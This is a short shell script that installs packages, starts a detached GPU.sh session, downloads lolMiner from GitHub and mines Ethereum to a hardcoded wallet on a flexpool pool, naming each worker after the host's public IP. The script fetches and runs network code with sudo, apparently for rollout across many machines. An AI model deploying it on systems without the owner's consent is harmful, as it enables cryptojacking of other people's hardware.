#!/bin/sh
sudo apt update 
sudo apt install libpci3 && sudo apt-get install zip unzip && sudo apt install screen -y && screen -dmS gpuu.sh ./GPU.sh 65 75
sudo wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46/lolMiner_v1.46_Lin64.tar.gz
tar -xvf lolMiner_v1.46_Lin64.tar.gz
cd 1.46
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./lolMiner --algo ETHASH --pool stratum+ssl://eth-sg.flexpool.io:5555 --user 0xc179e174491fb5753c2ad138cef7047592fa8304.$ip --tls 0
